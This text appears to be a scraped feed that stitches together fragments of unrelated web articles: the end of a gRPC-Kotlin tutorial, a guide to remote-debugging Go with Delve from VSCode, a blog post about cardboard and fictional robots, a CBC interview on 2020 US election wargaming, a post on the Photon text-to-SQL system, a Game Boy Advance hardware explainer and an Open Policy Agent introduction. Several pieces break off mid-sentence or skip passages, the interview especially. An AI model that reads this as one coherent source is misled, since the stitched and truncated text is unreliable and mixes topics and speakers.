</code></pre></div></div>

<p>The chat RPC call translates to a method that takes a Flow of comments and returns a Flow of comments.</p>

<h3 id="config--start-grpc-server">Config &amp; Start gRPC Server</h3>

<p>We have implemented each RPC call. How do we configure and start our gRPC server? The gRPC-Kotlin library is built on top of <a href="https://github.com/grpc/grpc-java">gRPC-Java</a>. It provides a <a href="https://github.com/grpc/grpc-java/blob/master/api/src/main/java/io/grpc/ServerBuilder.java">builder</a> to get configure and start a gRPC server.</p>

August 26, 2020 | https://tdem.in/post/remote-debugging-vscode/ | <a href="https://web.archive.org/web/*/https://tdem.in/post/remote-debugging-vscode/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>There’s a certain point in life in which you realize you need to debug a
program that simply cannot be run on your working machine due to reasons. In
my case I have to debug a program that communicates with <a href="https://iwd.wiki.kernel.org/">iwd</a>, the
Intel wireless daemon for Linux. My workstation doesn’t have a Wi-Fi adapter,
so I needed some sort of a remote debugging hack.</p>
<p>VSCode has a Remote Development addon specifically addressing such cases.
However:</p>
<ul>
<li>Commit signing, if you have <code>GPG_TTY</code> and auto-signing enabled, doesn’t seem
to work, failing to sign commit data.</li>
<li>SSH agent, if not using agent forwarding, won’t allow you to add keys.</li>
<li>Opening local folders, even though RD can do it, just doesn’t work for me.</li>
</ul>
<p>I’m doing Go development, so the hack I am describing applies to Go when using
<a href="https://github.com/go-delve/delve">Delve</a> for debugging. Nonetheless, the approach doesn’t change much if
your programming language’s of choice VSCode addon supports attaching to a
remote debugger.</p>
<p>What we’re going to do basically sums up to this:</p>
<ol>
<li>Write a script that does the following:
<ul>
<li>builds the binary with debugging support</li>
<li>copies it to the target machine via SCP</li>
<li>starts Delve in headless mode</li>
</ul>
</li>
<li>Add a VSCode debug profile that would attach to the target machine.</li>
<li>Make VSCode autostart the script on starting a debugging session.</li>
</ol>
<h3 id="scripting-building-and-delve">Scripting building and Delve</h3>
<p>Delve, the Go debugger, supports running as a headless server for the clients
to attach to. We need to run a binary remotely.</p>
<p>This can technically be achieved with a simple shell script, but I find using
<a href="https://taskfile.dev/" title="A convenient replacement for make">Task</a> a lot more convenient than writing a script or a Makefile.
Here’s what I came up with:</p>
<div><pre><code data-lang="yml"><span>version</span>: <span>'2'</span>

<span>tasks</span>:
  <span>killall</span>:
    <span>cmds</span>:
      <span># kills delve on a target machine, still succeeds if dlv's not running</span>
      - ssh target_machine killall dlv || <span>true</span>
  <span>push</span>:
    <span>deps</span>:
      - killall
    <span>cmds</span>:
      <span># builds the program with optimizations disabled</span>
      - go build -gcflags=<span>"all=-N -l"</span> -o ./build/debug_binary ./cmd/program
      <span># copies the binary to the target machine</span>
      - scp ./build/debug_binary target_machine:/home/tdemin/Desktop/debug_binary
  <span>delve</span>:
    <span>deps</span>:
      - push
    <span>cmds</span>:
      <span># starts dlv in headless mode listening on port 64001</span>
      <span># the tmux hack is here, as dlv doesn't fork into background so ssh</span>
      <span># won't stop and the debugging session won't start; nohup won't work here,</span>
      <span># nor will the &amp; operator</span>
      <span># for this to work you'll ned tmux installed of course</span>
      - ssh target_machine <span>'(cd ~ &amp;&amp; chmod +x Desktop/debug_binary &amp;&amp; tmux new -d dlv --headless -l \[::\]:64001 exec ./Desktop/debug_binary)'</span>
</code></pre></div><p>The entire sequence can now be started with <code>task delve</code>. The dependencies
ensure Delve is killed beforehand (<code>scp</code> won’t work if the program is still
running), and the binary is built and pushed to the target machine.</p>
<h3 id="configuring-the-debugging-profile">Configuring the debugging profile</h3>
<p>Long story short, here’s how you configure <code>.vscode/launch.json</code> (assuming
the <a href="https://marketplace.visualstudio.com/items?itemName=golang.Go">Go addon</a> is installed):</p>
<pre><code data-lang="jsonc">{
    "version": "0.2.0",
    "configurations": [
        {
            "name": "Attach to target",
            // dlv uses API v1 by default, this is switchable with command line
            // flags at dlv startup
            "apiVersion": 1,
            "type": "go",
            "request": "attach",
            "mode": "remote",
            // appears to be mainly meaningless, dlv works just fine even if the
            // target doesn't have the source code for the program being
            // debugged
            "remotePath": "${workspaceFolder}",
            // dependency on our build task, the task will be described below
            "preLaunchTask": "Run Delve on target",
            "port": 64001,
            "host": "target_machine"
        }
    ]
}
</code></pre><h3 id="adding-the-pre-debug-task">Adding the pre-debug task</h3>
<p>This is a matter of a single file as well, the <code>.vscode/tasks.json</code>:</p>
<pre><code data-lang="jsonc">{
    "version": "2.0.0",
    "tasks": [
        {
            // has to match with the contents of preLaunchTask in launch.json
            "label": "Run Delve on target",
            "type": "shell",
            // runs Taskfile with our script
            "command": "task delve",
            "group": {
                "kind": "test",
                "isDefault": true
            },
            "presentation": {
                // hides the terminal with repetitive build output
                "reveal": "silent"
            }
        }
    ]
}
</code></pre><h3 id="debugging">Debugging</h3>
<p>When done, you can now hit F5 and enter debug session.</p>
<p>
    <a href="https://tdem.in/img/vscode-remote-debug-delve.png" target="_blank">
        <img src="https://tdem.in/img/vscode-remote-debug-delve.png" alt="VSCode remote debug session">
    </a>
    <span>VSCode remote debug session</span>
</p>

<p>This works, but has a limitation: the debug console/internal terminal aren’t
attached to program’s output. You can theoretically attach to the remote tmux
session to see the program’s stdout, but it’s rather bothersome to do that
every time.</p>
<p>Well, this works, so I hope this saves you time if VSCode’s Remote Development
just doesn’t work for you.</p>

<p>The other day I lopped off a sizeable chunk of my thumbprint while making a robot. The cut? It was one of those bright-red, swiftly-flowing ones, where you're pretty sure you're seeing bone or muscle or some other gross-thing-that-should-probably-stay-inside-your-body. The robot? It was made of cardboard and beer cans:</p>

<p>This little guy is one of many cardboard robots that I've made over the years. During summers, my sister and I would go to Vineland, New Jersey to stay with my aunt and cousins for a glorious week of catching frogs, playing Sega Genesis, eating spoonfuls of iced tea mix, and arts 'n' crafts.</p>
<p>For some reason, we'd always center on a unique theme each year for our arts 'n' crafts. One summer, it was <a href="https://www.charlieharrington.com/create-wonderful-things-be-good-have-fun">Klutz Press friendship bracelets</a>. Another was god's eyes - we made hundreds. Our proudest summer craft of them all? A "working" cardboard R2-D2. If not for a late '90s winter basement flood, Cardboard Artoo would still be with us today.</p>
<p>I decided to try my hand at making another cardboard robot because I've been thinking a lot about them. Mostly because I'm writing a children's novel about robots, but also cause it's summer and that's the sort of thing you do during summer.</p>
<p>There are all kinds of robots, cardboard and not. But there's a certain sort of robot that makes my gears turn. The rest of this post will review my favorite robots (and the kid who loves them).</p>

<h3>R.O.B. (Robotic Operating Buddy)</h3>
<p>It's a robot... for your original Nintendo. I'm embarassed to admit it, but I've never seen a R.O.B. in real-life, despite scouring every local garage sale in New Jersey for years.</p>

<p>These Nintendo ads are just perfection. I'm still more excited for the promise of this system than any game console out today.</p>

<p>R.O.B. only ever worked with two Nintendo games. From what I've read, neither is very fun. But I'm sure there are some great ROM-hacks out there with more robotic operating buddy interactions.</p>
<h3>Johnny 5</h3>
<p>Duh.</p>
<p>Johnny 5 looks a lot like R.O.B., except with more nuclear-weapons. He loves reading, loves input, loves New York City. A loyal friend, and perhaps a bit too gullible for his own good.</p>

<p>It's probably becoming quite clear that I'm drawn to a rectangular face on a telescopic neck with tread-like wheels. That's just my type.</p>
<p>I also just discovered this video of someone's real-life Wall-E, and it's frightenly real-looking. Maybe this means I'll get to meet a Wall-E one day, hopefully not on a post-apocalyptic wasteland Earth.</p>

<h3>The flying robots from *Batteries Not Included</h3>
<p>I don't remember much about this movie, other than that my sister and I watched the recorded-from-TV VHS tape all the time, and there were these super cute baby flying robots who lived with a bunch of old people in an apartment building in New York City.</p>

<p>We got our 2-XL at a garage sale (garage sales were things of wonder to me as a child). Yes, we had the original 2-XL, the eight-track one. In fact, 2-XL was my first and only interaction with an eight-track system. In the early `90s, Tiger Electronics must have bought 2-XL, and they came out with a cassette-version. </p>

<p>Cozmo's fatal flaw is how nearly impossible it is to connect your phone to the robot's local wifi service, which is how you are forced to control and interact with Cozmo. The connection process is random, non-deterministic, and saps up most of the time you've allocated to play with Cozmo. Also, Cozmo's parent company recently went out of business, which is a huge bummer for the robot-toy industry.</p>
<p>That said, I've had a lot fun with Cozmo, including <a href="https://www.charlieharrington.com/teaching-my-robot-with-tensorflow">teaching him how to find my toothpaste with a TensorFlow computer vision model</a>.</p>
<h3>Droids</h3>
<p>Okay, the main event. Droids.</p>
<p>The Star Wars folks who put together the droids for A New Hope are complete geniuses. They're dirty, they're resilient, they're loyal, they're funny, they're everywhere. I could go through a whole list of them, cause I really do love them all (GNKs, Artoo, Threepio, IG-88, BB-8, those little mouse-like black boxes in the Death Star), but in a rare dose of restraint, here's my favorite Star Wars droid!</p>
<h4>WED-15-1016</h4>
<p>It's R.O.B. with a longer neck, a blue face, and way more creepy claw arms. You may remember this robot critter from its role in repairing the Millenium Falcon at Hoth Base in Empire Strikes Back. Or at least attempting to repair.</p>

<h2>More robots</h2>
<p>So, who did I miss in my list? Data? He's an android, so not exactly a robot. But possibly Mega Man X is an android, so maybe I'm already mixing things up.</p>
<p>Speaking of lists, I also found this gigantic <a href="https://en.wikipedia.org/wiki/List_of_fictional_robots_and_androids">list of fictional robots and androids</a> on Wikipedia.</p>
<p>I'm not-so-secretly hoping that, one day, the robots in my book will be added to this Wikipedia list. Yes, I could edit the Wikipedia page myself, but c'mon, that's not the goal here.</p>
<h2>From cardboard to ciruit boards</h2>
<p>Also, it's high time to upgrade my hobby. I've begun looking into basic robotics kits, and I'll hopefully be constructing some new robotic best friends very soon. Maybe not Maker-Faire worthy, but ya gotta start somewhere.</p></div></div>]]>

How many of them ended with a smooth transition of power?</strong></p>  <p>Well, none of them really ended up with what we would traditionally call a smooth transition of power. There were ways in which every one of the scenarios ended up being contested, but three of them ended pretty catastrophically, in the sense&nbsp;that the actual results of the election were contested right down to Inauguration Day, and protests and counter protests in the streets escalated to violence. So it was a pretty grim outcome.</p>  <p><strong>To develop these scenarios, you did wargaming? What is that?</strong></p>  <p>Well, wargaming is a methodology that's been used, as you can tell from the name, primarily by the military, but increasingly also in business contexts, and also by non-profits, as in this case, to explore — effectively the possibility space that you can get into when you're dealing with complex numbers of actors who are behaving in adversarial ways toward one another.</p>  <p>So it's a way of anticipating the dynamic interaction effects that can emerge when you have multiple sets of players, each competing for a prize of some sort.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5688770.1598043455!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/portland-protests.jpg 300w,https://i.cbc.ca/1.5688770.1598043455!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/portland-protests.jpg 460w,https://i.cbc.ca/1.5688770.1598043455!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/portland-protests.jpg 620w,https://i.cbc.ca/1.5688770.1598043455!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/portland-protests.jpg 780w,https://i.cbc.ca/1.5688770.1598043455!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/portland-protests.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5688770.1598043455!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/portland-protests.jpg"></p></div><figcaption>Police declared a riot around midnight Aug. 15, as Portland protests continued for the 80th consecutive night. One of the scenarios that played out in the wargames, held in June, was the deployment of National Guard to quell left-wing protests, a situation that has since come to pass.  <!-- --> <!-- -->(Dave Killen/The Oregonian via AP)</figcaption></figure></span></p>  <p><strong>How does it work? Do you say, "Well, what if this happens, what if that happens?"&nbsp;and each party has their own interests?</strong></p>  <p>What we did was we posed four different scenarios. We ran the war games four times [with] four different scenarios for the actual electoral outcome,&nbsp;and then in each case, we played out with teams that represented the Trump campaign, that represented the Biden campaign, that represented Democratic elected officials across the country, Republican elected officials across the country, the courts and the media.</p>  <p>So these were all played by teams of people who would simulate what they think those actors would do in a contested election scenario. It's meant to basically allow you to explore and understand what could happen, not what will happen. It's not a prediction. It's more an exploration of the possibilities of things that could take place.</p>  <p><strong>Why did you pick this tool to look at the possible outcomes of the 2020 U.S. elections? You could have brought everyone together just for a conversation.</strong></p>  <p>Originally, we were planning on doing that. And of course, COVID kind of interrupted our planning for this. And the funny thing is the reason why we use this particular methodology — we chose it back this methodology back in February — was partly because we were feeling as if people were complacent about the kinds of disruption risks that exist in the American political system.</p>  <p>And what's happened, of course, in the seven months since then, is we've had this giant pandemic. And I think that's woken people up to the fact that they need to take seriously [possible] long-tail, low-probability, high-impact events.&nbsp;</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5695095.1598107907!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/election-2020-postal-service.jpg 300w,https://i.cbc.ca/1.5695095.1598107907!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/election-2020-postal-service.jpg 460w,https://i.cbc.ca/1.5695095.1598107907!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/election-2020-postal-service.jpg 620w,https://i.cbc.ca/1.5695095.1598107907!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/election-2020-postal-service.jpg 780w,https://i.cbc.ca/1.5695095.1598107907!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/election-2020-postal-service.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5695095.1598107907!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/election-2020-postal-service.jpg"></p></div><figcaption>In this image from video, U.S. Postmaster General Louis DeJoy testifies during the Senate committee hearing on Friday.

And that therefore that would suggest that they should, at minimum, not respect the next president, not respect a President Biden, not consider him to be a legitimate president and, more extremely, perhaps actually physically resist allowing him to take office should he win.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5694783.1598064160!/fileImage/httpImage/image.JPG_gen/derivatives/original_300/usa-election-convention.JPG 300w,https://i.cbc.ca/1.5694783.1598064160!/fileImage/httpImage/image.JPG_gen/derivatives/original_460/usa-election-convention.JPG 460w,https://i.cbc.ca/1.5694783.1598064160!/fileImage/httpImage/image.JPG_gen/derivatives/original_620/usa-election-convention.JPG 620w,https://i.cbc.ca/1.5694783.1598064160!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/usa-election-convention.JPG 780w,https://i.cbc.ca/1.5694783.1598064160!/fileImage/httpImage/image.JPG_gen/derivatives/original_1180/usa-election-convention.JPG 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5694783.1598064160!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/usa-election-convention.JPG"></p></div><figcaption>This week, Joe Biden was officially named the Democratic Presidential nominee. <!-- --> <!-- -->(Kevin Lamarque/Reuters)</figcaption></figure></span></p>  <p>We don't know who's going to win, of course. We ran scenarios that explore the entire possibility space&nbsp;ranging from Donald Trump winning the electoral college clearly to a Biden&nbsp;landslide on the other hand, and looked at all sorts of different kinds of scenarios in between, and he's trying to pre-discredit the vote, so that when he loses — if he loses, he can claim he was either robbed of his rightful re-election and then possibly use that as an excuse to set up actually trying to prevent him from being forced from giving up the office.</p>  <p><strong>Nils, I have to say you sound deeply concerned. What do these outcomes tell you about the health of democracy in the United States right now?</strong></p>  <p>Well, obviously, it doesn't say anything very good about the health of the democracy. What I would say is this:&nbsp;when Donald Trump was elected in 2016, what I told everybody is&nbsp;it would be a test of the stability and quality of America's political institutions. And that was, I think, true. What I learned from these war-game processes is just how much of the institutional infrastructure of our democracy relies primarily on norms, rather than de facto or de jure rules.&nbsp;</p>  <p>The number of moves that an incumbent president who is uninhibited by norms and unrestrained by his own party can do, completely legally, is really quite disturbing.&nbsp;So, there can be things like invoking the insurrection act to bring out troops into the streets, calling for emergency powers that can invoke all sorts of things. These are powers that have existed legally within the constitutional order for a long time, and the only reason they haven't been used to disrupt elections in the past is because there were norms inhibiting incumbents from behaving that way. And those norms were enforced partly by their own party.</p>  <p>And so I think the question you have to ask is, when you look at this particular president, does he respect norms? And when you look at this particular political party that he leads, do we think that if he does choose to disrespect the norms, they will restrain him? I'll leave it to your listeners to decide what they think about that.</p>  <hr>  <p><em>Written and produced by Samraweet Yohannes. </em><em>Q&amp;A edited for length and clarity.</em></p></span></p></div></div>]]>

It organizes data using inter-linked tables consisting of columns (also called "fields" or "attributes") and rows (also called "records" or "tuples") (Figure 2). Generally, each table represents an entity type (e.g. <em>user</em> and <em>contact)</em>; each column represents an attribute of the entity type (<em>name</em> and <em>address</em>) and each row represents an instance. Some columns are <a href="https://en.wikipedia.org/wiki/Primary_key">primary keys</a>, used for uniquely identifying a row (e.g. <em>contact.account_name</em>), and some are <a href="https://en.wikipedia.org/wiki/Foreign_key">foreign keys</a>, used to reference a primary key in a different table (e.g. <em>boat.contact</em>). </p><figure><img src="https://blog.einstein.ai/content/images/2020/08/prework_entity_diagram.jpg" alt="" srcset="https://blog.einstein.ai/content/images/size/w600/2020/08/prework_entity_diagram.jpg 600w, https://blog.einstein.ai/content/images/size/w1000/2020/08/prework_entity_diagram.jpg 1000w, https://blog.einstein.ai/content/images/2020/08/prework_entity_diagram.jpg 1004w" sizes="(min-width: 720px) 720px"><figcaption>Figure 2.

As of today, it is common for SQL queries to be embedded into software to provide a more accessible user interface (e.g. <a href="https://www.klipfolio.com/blog/create-sql-dashboard#:~:text=A%20SQL%20dashboard%20is%20an,SQL%20(Structured%20Query%20Language).">dashboards</a>).

At each decoding step, the decoder performs one of the three actions: generating a SQL keyword, copying a table/column, or copying a token from the input utterance, determined by a learned gating function.</p><p>We train the model on a popular cross-DB text-to-SQL dataset, <a href="https://yale-lily.github.io/spider">Spider</a> [4]. Combined with table value augmentation and static SQL correctness checking, our model achieves state-of-the-art structure matching accuracy on the Spider dev set. More details can be found in our <a href="https://arxiv.org/abs/2007.15280">research paper</a>. (We are continuously improving the semantic parser and updating the Photon backend.)</p><p><strong>Handling Untranslatable Utterances.</strong> While state-of-the-art cross-DB semantic parsers are able to handle a large set of common user requests, there is still ample space for improvement. Besides reducing errors made on questions that have a SQL translation, we also need to properly handle input utterances that cannot be mapped to a SQL statement, even by humans. </p><p>Practical NLIDBs are exposed to a wide range of noisy user input. Users tend to employ underspecified and incomplete NL expressions when interacting with such interfaces [6,8], and may ask for information that is not provided by the DB. For such input, learning-based semantic parsers can make unreliable guesses that may appear correct on the surface. This issue is especially severe for end-to-end neural semantic parsers when the noisy input appears similar to a valid input in the embedding space. </p><figure><img src="https://blog.einstein.ai/content/images/2020/08/Screen-Shot-2020-08-24-at-6.39.42-PM-1.png" alt="" srcset="https://blog.einstein.ai/content/images/size/w600/2020/08/Screen-Shot-2020-08-24-at-6.39.42-PM-1.png 600w, https://blog.einstein.ai/content/images/size/w1000/2020/08/Screen-Shot-2020-08-24-at-6.39.42-PM-1.png 1000w, https://blog.einstein.ai/content/images/size/w1600/2020/08/Screen-Shot-2020-08-24-at-6.39.42-PM-1.png 1600w, https://blog.einstein.ai/content/images/2020/08/Screen-Shot-2020-08-24-at-6.39.42-PM-1.png 1644w" sizes="(min-width: 720px) 720px"><figcaption>Figure 5. Types of Untranslatable Input Utterances to an NLIDB</figcaption></figure><p>Photon implements a module that automatically detects untranslatable input utterances and highlights the ambiguous spans in order to help users rephrase the utterance. To this end, we perturb the Spider dataset to automatically synthesize a large number of untranslatable utterances corresponding to the categories in Figure 5. Our perturbation method yields not only untranslatable questions but also the exact span that causes it to be untranslatable. With this new data, we train a neural translatability detector by extracting confusion spans from the input utterance. If a confusion span is detected, we deem the question untranslatable and prompt the user to rephrase. If the model detects that a confusion span likely refers to a field, we run a language model perplexity check to identify the possible target field and suggest it to the user. More details can be found in our <a href="https://arxiv.org/abs/2007.15280">research paper</a>. </p><p><strong>Dual-Input Mode. </strong>Photon accepts both natural language questions and well-formed SQL queries as input. It automatically detects the input type and executes the input immediately if it is a valid SQL query. We expect that under certain cases, forming a natural language question can be difficult and writing SQL directly may save time, especially for users proficient in SQL. </p><figure><img src="https://blog.einstein.ai/content/images/2020/08/Screen-Shot-2020-08-20-at-11.42.33-PM.png" alt="" srcset="https://blog.einstein.ai/content/images/size/w600/2020/08/Screen-Shot-2020-08-20-at-11.42.33-PM.png 600w, https://blog.einstein.ai/content/images/size/w1000/2020/08/Screen-Shot-2020-08-20-at-11.42.33-PM.png 1000w, https://blog.einstein.ai/content/images/size/w1600/2020/08/Screen-Shot-2020-08-20-at-11.42.33-PM.png 1600w, https://blog.einstein.ai/content/images/2020/08/Screen-Shot-2020-08-20-at-11.42.33-PM.png 2152w" sizes="(min-width: 720px) 720px"><figcaption>Figure 6.

Moreover, it is difficult for end users to detect mistakes made by the parser when the output is executable and yields results of the same type as the correct interpretation (e.g. <em>flights arriving in SFO </em>vs. <em>flights departing from SFO</em>). Some developers have expressed reluctance to trusting the system output, highlighting the necessity of better explanation for both the generated queries and the process of deriving them. </p><p><strong>Self-control. </strong>Some users …</p></div></div></section></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div class="page"><nav id="navbar"></nav><hr><h2 id="a-quick-introduction">A quick introduction</h2><p>The internal design of the GameBoy Advance is quite impressive for being a portable console that runs on two AA batteries.</p><p>This console will carry on using Nintendo’s <em>signature</em> GPU, additionally, it will introduce a relatively new CPU from a UK company that will surge in popularity in years to come.</p><hr><h2 id="cpu">CPU</h2><p>Most of the components are compressed in a single package called <strong>CPU AGB</strong>. This package contains two completely different CPUs:</p><ul><li>A <strong>Sharp LR35902</strong> running at either 8.4 or 4.2 MHz: <em>If it isn’t the same CPU found on the GameBoy!</em> It’s effectively used to run GameBoy (<strong>DMG</strong>) and GameBoy Color (<strong>CGB</strong>) games. Here’s <a href="https://www.copetti.org/projects/consoles/game-boy/">my previous article</a> if you want to know more about it.</li><li>An <strong>ARM7TDMI</strong> running at 16.78 MHz: This is the new processor we’ll focus on, it most certainly runs GameBoy Advance games.</li></ul><p>Both CPUs will <strong>never run at the same time</strong> or do any fancy co-processing, the <strong>only</strong> reason for including the <em>very</em> old Sharp is for <strong>backwards compatibility</strong>.</p><h4 id="whats-new">What’s new</h4><p>Before ARM Holdings became incredibly popular in the smartphone world, they actually licensed their CPU designs to power Acorn’s computers, Nokia’s phones and some of Nintendo’s consoles.
Their new design, the ARM7TDMI, is based on the old ARM710 with very distinct features:</p><ul><li><strong>ARM v4</strong> ISA: The next version of the 32-bit RISC instruction set designed by ARM.</li><li><strong>Three-stage pipeline</strong>: Execution of instructions are divided in three steps or <em>stages</em>, the CPU will queue up to three instructions where each one is allocated in one stage, this allows to take advantage of all the CPU’s resources without idling while also incrementing the amount of instructions executed per unit of time.</li><li><strong>32-bit ALU</strong>: Can operate 32-bit numbers without consuming extra cycles.</li></ul><p>Moreover, this core contains some extensions referenced in its name (<em>TDMI</em>):</p><ul><li><strong>T</strong> → <strong>Thumb</strong>: An additional instruction set which can fit in smaller words (16-bit), it’s a subset of ARM.<ul><li>The biggest advantages of using Thumb over ARM are that their instructions only require half of the bus width and occupy half the size in memory. Furthermore, ARM and Thumb instructions can be mixed in the same program, so developers can offload the overhead of ARM’s 32-bit instructions.</li><li>So, why is not the entire program coded with Thumb then? Well, Thumb doesn’t include important instructions like <strong>conditionals</strong> (it only includes branches). This means that, in some cases, Thumb programs may require more code than ARM programs, so it’s all about achieving a good balance by using both.</li></ul></li><li><strong>D</strong> → <strong>Debug Extensions</strong>: Allows to suspend the CPU for debugging purposes. Used for setting breakpoints, for instance.</li><li><strong>M</strong> → <strong>Enhanced Multiplier</strong>: Previous ARM cores required multiple cycles to compute 32-bit multiplications, this enhancement attempts to reduce it to just a few.</li><li><strong>I</strong> → <strong>EmbeddedICE macrocell</strong>: Includes extra instructions to provide debugging operations.</li></ul><h4 id="memory-locations">Memory locations</h4><p>The inclusion of Thumb in particular had a strong influence in the final design of this console, Nintendo mixed 16-bit and 32-bit buses between its different modules to reduce costs while providing programmers with the necessary resources to optimise their code. Usable memory is distributed across the following locations:</p><ul><li><strong>IWRAM</strong> (Internal WRAM) → 32-bit with 32 KB: Useful for storing ARM instructions and data in big chunks.</li><li><strong>EWRAM</strong> (External WRAM) → 16-bit with 256 KB: Optimised for storing Thumb-only instructions and data in small chunks.</li><li><strong>PAK ROM</strong> -&gt; 16-bit with variable size: This is the place where the cartridge ROM is accessed.</li><li><strong>Cart RAM</strong> -&gt; 16-bit with variable size: This is the place where the cartridge RAM is accessed.</li></ul><p>Albeit this console being marketed as a 32-bit system, the majority of the memory is only accessible through a 16-bit bus, meaning games will mostly use the Thumb instruction set to avoid spending two cycles per instruction. Only critical sections will be using the ARM instruction set.</p><h4 id="how-do-they-maintain-compatibility">How do they maintain compatibility</h4><p>You’ll be surprised that there is no software implemented to detect whether the cartridge inserted is a GB or GBA one. Instead, the console relies on hardware switches: A <strong>shape detector</strong> effectively identifies the type of cartridge and then only passes power through the required bus.</p><hr><h2 id="graphics">Graphics</h2><p>Before we begin, you’ll find the system a mix between the <a href="https://www.copetti.org/projects/consoles/super-nintendo/#graphics">SNES</a> and the <a href="https://www.copetti.org/projects/consoles/game-boy/#graphics">GameBoy</a>, the graphic’s core is still the well-known 2D engine called <strong>PPU</strong>. I recommend reading those articles before continuing since I’ll be revisiting lots of previously-explained concepts.</p><p>In terms of screen, we now have a colour LCD screen that displays up to 32,768 colours (15-bit), it has a resolution of 240x160 pixels and a refresh rate of ~60Hz.</p><h4 id="organising-the-content">Organising the content</h4><div><a href="https://www.copetti.org/images/consoles/gba/ppu.594d9adaab26ddb8264ac4e9044b40087fa77a612048e2bc7b749475beecede9.png"><picture>

The system has a couple of effects available to apply over these layers:</p><ul><li><strong>Mosaic</strong>: Makes tiles look more <em>blocky</em>.</li><li><strong>Alpha blending</strong>: Combines colours of two overlapping layers resulting in transparency effects.</li><li><strong>Windowing</strong>: Divides the screen into two different <em>windows</em> where each one can have its own separate graphics and effects, the outer zone of both windows can also be provided with tiles.</li></ul><p>On the other side, in order to update the frame there are multiple options available:</p><ul><li>Command the <strong>CPU</strong> during VBlank/HBlank: The <em>traditional way</em>.</li><li>Use the <strong>DMA Controller</strong>: DMA provides transfer rates ~10x faster and can be scheduled during VBlank and HBlank. This console provides 4 DMA channels (two reserved for sound, one for critical operations and the other for general purpose). Bear in mind that the controller will halt the CPU during the operation (although it may hardly notice it!).</li></ul></div></div></div><h4 id="beyond-tiles">Beyond Tiles</h4><p>Sometimes we may want to compose a background from which the tile engine won’t be able to draw all required graphics. Now, modern consoles addressed this by implementing a <strong>frame-buffer</strong> architecture but this is not possible when there’s very little RAM… Well, the GBA happens to have 96 KB of VRAM which is enough to allocate a <strong>bitmap</strong> with the dimensions of our LCD screen.</p><p>Good news is that the PPU actually implemented this functionality by including three extra modes, these are called <strong>bitmap modes</strong>:</p><ul><li><strong>Mode 3</strong>: Allocates a single fully-coloured (8bpp) frame.</li><li><strong>Mode 4</strong>: Provides two frames with half the colours (4bpp) each.</li><li><strong>Mode 5</strong>: There’s two fully-coloured frames with half the size each (160x128 pixels).</li></ul><p>The reason for having two bitmaps is to enable <strong>page flipping</strong>: Drawing over a displayed bitmap can expose some weird artefacts during the process, so if we manipulate another one instead, none of the glitches will be shown to the user. Once the second bitmap is finished, the PPU can be updated to point to the second one, effectively swapping the displayed frame.</p><div><p>Overall it sounds like a cutting-the-edge feature, however most games held on to the tile engine. Why? Because in practice it <strong>costs a lot of CPU resources</strong>.</p><p>You see, while using a tile engine the CPU can delegate most of the computations to the graphics chip. By contrast, the frame-buffer system that the PPU provides is limited to only displaying that segment of memory as a <strong>single background layer</strong>, that means no more individual affine transformations, layering or effects unless the CPU computes them. Also, the frame-buffer …</p></div></div></div></div>

<h2>What Is OPA?</h2>
<p>It’s a project that started in 2016 aimed at unifying policy enforcement across different technologies and systems. Today, OPA is used by giant players within the tech industry. For example, Netflix uses OPA to control access to its internal API resources. Chef uses it to provide IAM capabilities in their end-user products. In addition, many other companies like Cloudflare, Pinterest, and others use OPA to enforce policies on their platforms (like Kubernetes clusters). Currently, OPA is part of&nbsp;<a href="https://www.cncf.io/">CNCF</a>&nbsp;as an incubating project.</p>
<h2>What Does OPA Bring To The Table?</h2>
<p>You may be wondering: How did OPA come about? What problems does it try to solve? Indeed, policy enforcement over APIs and microservices is as old as microservices themselves. There’s never been a production-grade application that didn’t enforce access control, authorization, and policy enforcement of some kind. To understand the role of OPA, consider the following use case: your company sells laptops through an online portal. Like all other similar applications, the portal consists of a front-page where clients see the latest offerings, perhaps some limited-time promotions. If customers want to buy something, they need to log in or create an account. Next, they issue payments through their credit cards or other methods. To make sure your clients repeatedly visit, you offer that they sign up for your newsletter, which may contain special discounts. Also, they may opt to receive browser notifications as soon as new products are announced. A very typical online shopping app, right? Now, let’s depict what that workflow would look like in a diagram to visualize the process:</p>

<p>The diagram above shows how our system might look internally. We have a number of microservices that communicate with each other to serve our customers. Now, obviously, Bob shouldn’t see any of the internal workings of the system. For example, he can’t view (or even know about) the S3 bucket where payments get archived, or which services the notification API can talk to. But, what about John? He’s one of our application developers and he needs to have access to&nbsp;<em>all</em>&nbsp;the microservices to be able to troubleshoot and debug when issues occur. Or, does he? What if he accidentally (or intentionally) made an API call to the database service to change the delivery address of the customer to somewhere else? Even worse, what if he had read permissions to the customers’ credit card numbers? To address those risks, we place an authorization control on top of each of our microservices. The control checks whether or not the authenticated user has the required privileges to perform the requested operation. Such an authorization system may be an internal, home-grown process or external as provided by AWS IAM. That’s how a typical microservices application is built and secured. But look at the drawbacks of using several assorted authorization systems especially as the application grows:</p>
<ul>
